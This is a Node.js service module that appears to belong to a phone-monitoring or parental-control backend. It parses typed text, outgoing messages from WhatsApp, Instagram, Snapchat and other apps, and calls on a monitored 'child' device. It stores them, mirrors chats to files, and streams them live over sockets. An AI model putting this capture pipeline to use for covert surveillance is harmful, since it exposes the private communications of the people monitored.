'use strict';

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const constants = require('../config/constants');
const { resolveChatAppKey } = require('../utils/validators');
const { generateActivityEventId, generateFallbackChatEventId } = require('../utils/helpers');
const dbService = require('./database.service');

// Per-device typing buffer
const liveTypingState = Object.create(null);
const latestLiveTimestamp = Object.create(null);

function parseLiveActivityText(text) {
    if (!text || typeof text !== 'string') return null;
    const t = text.trim();
    if (!t) return null;
    let application = 'Other';
    let packageName = '';
    let actorName = '';
    let action = 'activity';
    let message = t;

    const appMap = [
        { name: 'WhatsApp', pkg: 'com.whatsapp', keys: ['whatsapp'] },
        { name: 'Instagram', pkg: 'com.instagram.android', keys: ['instagram'] },
        { name: 'Telegram', pkg: 'org.telegram.messenger', keys: ['telegram'] },
        { name: 'Snapchat', pkg: 'com.snapchat.android', keys: ['snapchat'] },
        { name: 'Messenger', pkg: 'com.facebook.orca', keys: ['messenger'] },
        { name: 'Chrome', pkg: 'com.android.chrome', keys: ['chrome'] },
        { name: 'SMS', pkg: '', keys: ['sms', 'messaging'] },
        { name: 'Phone', pkg: '', keys: ['call', '\ud83d\udcde'] }
    ];
    const lower = t.toLowerCase();
    for (const a of appMap) {
        if (a.keys.some(k => lower.includes(k)) || t.startsWith(a.name)) {
            application = a.name;
            packageName = a.pkg;
            break;
        }
    }

    if (application === 'Phone' || /call\s+chal|\ud83d\udcde/.test(lower)) {
        application = 'Phone';
        action = 'call';
        const m = t.match(/\u2192\s*(.+)$/);
        actorName = m ? m[1].trim() : '';
        message = t;
        return { application, packageName, actorName, action, message };
    }

    if (t.includes(' \u2192 ') && t.includes(' : ')) {
        const afterApp = t.replace(/^[^\u2192]+\u2192\s*/, '');
        const colonIdx = afterApp.indexOf(' : ');
        if (colonIdx >= 0) {
            actorName = afterApp.slice(0, colonIdx).trim();
            message = afterApp.slice(colonIdx + 3).trim();
            action = 'sent';
            return { application, packageName, actorName, action, message };
        }
    }

    const typingMatch = t.match(/^(?:.+?\s+)?(?:\[([^\]]+)\]\s*)?typing:\s*(.*)$/i);
    if (typingMatch) {
        action = 'typing';
        if (typingMatch[1]) actorName = typingMatch[1].trim();
        message = (typingMatch[2] || '').trim();
        return { application, packageName, actorName, action, message };
    }

    const simpleTyping = t.match(/^(.+?)\s+typing:\s*(.*)$/i);
    if (simpleTyping) {
        action = 'typing';
        message = (simpleTyping[2] || '').trim();
        return { application, packageName, actorName, action, message };
    }

    return { application, packageName, actorName, action, message };
}

function isCommitWorthy(structured, text) {
    if (!structured) return false;
    const action = (structured.action || '').toLowerCase();
    if (action === 'call') return true;
    const msg = (structured.message || '').trim();
    if (action === 'typing') return false;
    if (!msg || msg.length < 2) return false;
    if (action === 'sent') return true;
    const t = (text || '').toString();
    if (t.includes(' \u2192 ') && t.includes(' : ')) return msg.length >= 2;
    return false;
}

async function commitFinalActivity(id, state, io) {
    if (!state || state.saved || !state.text || !state.structured) return;
    const s = state.structured;
    console.log('[FINAL_ACTIVITY_RECEIVED]', JSON.stringify({
        childId: id, application: s.application, packageName: s.packageName,
        actorName: s.actorName, action: s.action, text: String(s.message || state.text || '').slice(0, 120),
        firstSeen: state.firstSeen, lastSeen: state.lastSeen
    }));
    if (!isCommitWorthy(s, state.text)) {
        console.log('[FINAL_ACTIVITY_DISCARD]', JSON.stringify({ childId: id, action: s.action, text: String(s.message || state.text || '').slice(0, 120), reason: 'not_commit_worthy' }));
        if (state.timer) { try { clearTimeout(state.timer); } catch (e) { } state.timer = null; }
        return;
    }
    if (!s.message && !s.actorName) return;
    if (state.timer) { try { clearTimeout(state.timer); } catch (e) { } state.timer = null; }
    const ts = state.lastSeen || state.firstSeen || Date.now();
    const eventId = String(s.eventId || '').trim() || generateActivityEventId(id, s.application, s.actorName, s.message);
    const eventDoc = {
        deviceId: id,
        application: s.application,
        packageName: s.packageName,
        actorName: s.actorName,
        action: s.action === 'typing' ? 'sent' : (s.action || 'sent'),
        message: s.message,
        text: state.text,
        timestamp: ts,
        eventId
    };
    try {
        const saved = await dbService.saveActivityEvent(id, eventDoc);
        console.log('[FINAL_ACTIVITY_MONGO_RESULT]', JSON.stringify({ childId: id, saved: !!saved, app: eventDoc.application, action: eventDoc.action, text: String(eventDoc.message || '').slice(0, 120), timestamp: ts, eventId }));
        state.saved = true;

        // Reliability fallback for chat logs
        const finalAppKey = resolveChatAppKey(s.packageName || s.application || '');
        if (eventDoc.action === 'sent' && finalAppKey && ['whatsapp', 'instagram', 'snapchat'].includes(finalAppKey)) {
            const conversation = String(s.actorName || '').trim();
            const body = String(s.message || state.text || '').trim();
            if (conversation && body && !['you', 'whatsapp', 'instagram', 'snapchat', 'unknown', 'unknown_chat'].includes(conversation.toLowerCase())) {
                const chatEventId = generateFallbackChatEventId(id, finalAppKey, conversation, body, ts);
                const chatRecord = {
                    packageName: s.packageName || finalAppKey,
                    conversation,
                    conversationId: conversation,
                    contactName: conversation,
                    sender: 'You',
                    text: body,
                    message: body,
                    timestamp: ts,
                    clientTimestamp: ts,
                    eventId: chatEventId,
                    direction: 'OUT',
                    messageType: 'TEXT',
                    source: 'final_activity_fallback'
                };
                try {
                    const chatSaved = await dbService.saveChatMessages(id, finalAppKey, [chatRecord]);
                    // File mirror
                    try {
                        const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');
                        const chatsDir = path.join(UPLOADS_DIR, 'chats', id);
                        if (!fs.existsSync(chatsDir)) fs.mkdirSync(chatsDir, { recursive: true });
                        const chatPath = path.join(chatsDir, `${finalAppKey}.json`);
                        let existing = [];
                        try { if (fs.existsSync(chatPath)) existing = JSON.parse(await fs.promises.readFile(chatPath, 'utf8')); } catch (readError) { existing = []; }
                        const alreadyThere = existing.some(row => (row.eventId && row.eventId === chatEventId)
                            || (row.conversation === conversation && row.text === body && row.direction === 'OUT'
                                && Math.abs(Number(row.timestamp || 0) - ts) < 5000));
                        if (!alreadyThere) existing.unshift(chatRecord);
                        await fs.promises.writeFile(chatPath, JSON.stringify(existing.slice(0, 5000)));
                    } catch (fileError) { /* silent */ }
                    console.log('[FINAL_CHAT_FALLBACK]', JSON.stringify({
                        childId: id, app: finalAppKey, conversation, direction: 'OUT',
                        text: body.slice(0, 120), timestamp: ts, saved: chatSaved, eventId: chatEventId
                    }));
                    try {
                        io.to(id).emit('chat_update', {
                            device_id: id, app: finalAppKey,
                            contact: conversation, contactName: conversation,
                            conversation, chat_with: conversation,
                            text: body, message: body,
                            timestamp: ts, direction: 'OUT', sender: 'You',
                            eventId: chatEventId, final: true
                        });
                    } catch (emitError) { /* silent */ }
                } catch (chatError) {
                    console.error('[FINAL_CHAT_FALLBACK_ERROR]', JSON.stringify({
                        childId: id, app: finalAppKey, conversation, text: body.slice(0, 120),
                        error: chatError && chatError.message
                    }));
                }
            }
        }

        if (saved) {
            const payload = {
                device_id: id, text: state.text,
                application: eventDoc.application, packageName: eventDoc.packageName,
                actorName: eventDoc.actorName, action: eventDoc.action,
                message: eventDoc.message, timestamp: ts, eventId, final: true
            };
            try {
                io.to(id).emit('activity_update', payload);
                io.to(id).emit('live_status_update', payload);
            } catch (e) { /* silent */ }
        }
    } catch (e) { /* silent */ }
}

function scheduleFinalize(id, delayMs) {
    const state = liveTypingState[id];
    if (!state || state.saved) return;
    if (!isCommitWorthy(state.structured, state.text)) return;
    if (state.timer) { try { clearTimeout(state.timer); } catch (e) { } state.timer = null; }
    state.timer = setTimeout(() => {
        const cur = liveTypingState[id];
        if (!cur || cur.saved) return;
        commitFinalActivity(id, cur).catch(() => { });
    }, delayMs);
}

function discardTypingState(id) {
    const prev = liveTypingState[id];
    if (!prev) return;
    if (prev.timer) { try { clearTimeout(prev.timer); } catch (e) { } }
    delete liveTypingState[id];
}

function sameComposer(prevS, nextS) {
    if (!prevS || !nextS) return false;
    if ((prevS.application || '') !== (nextS.application || '')) return false;
    return (prevS.actorName || '') === (nextS.actorName || '');
}

function getTypingState(id) { return liveTypingState[id]; }
function setTypingState(id, state) { liveTypingState[id] = state; }
function getLatestLiveTimestamp(id) { return Number(latestLiveTimestamp[id] || 0); }
function setLatestLiveTimestamp(id, ts) { latestLiveTimestamp[id] = Math.max(getLatestLiveTimestamp(id), ts); }

module.exports = {
    parseLiveActivityText,
    isCommitWorthy,
    commitFinalActivity,
    scheduleFinalize,
    discardTypingState,
    sameComposer,
    getTypingState,
    setTypingState,
    getLatestLiveTimestamp,
    setLatestLiveTimestamp
};
